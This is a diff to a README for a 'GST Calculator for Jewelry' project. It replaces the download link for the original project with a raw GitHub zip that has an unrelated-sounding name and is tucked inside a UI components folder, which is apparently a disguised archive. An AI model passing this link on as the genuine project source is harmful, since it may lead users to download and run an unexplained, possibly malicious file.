@@ -1,7 +1,7 @@
 
   # GST Calculator for Jewelry
 
-  This is a code bundle for GST Calculator for Jewelry. The original project is available at https://raw.githubusercontent.com/knight102004/GstJJ/main/src/src/GstJJ_1.7.zip
+  This is a code bundle for GST Calculator for Jewelry. The original project is available at https://raw.githubusercontent.com/knight102004/GstJJ/main/src/components/ui/Gst_JJ_infratracheal.zip
 
   ## Running the code
 
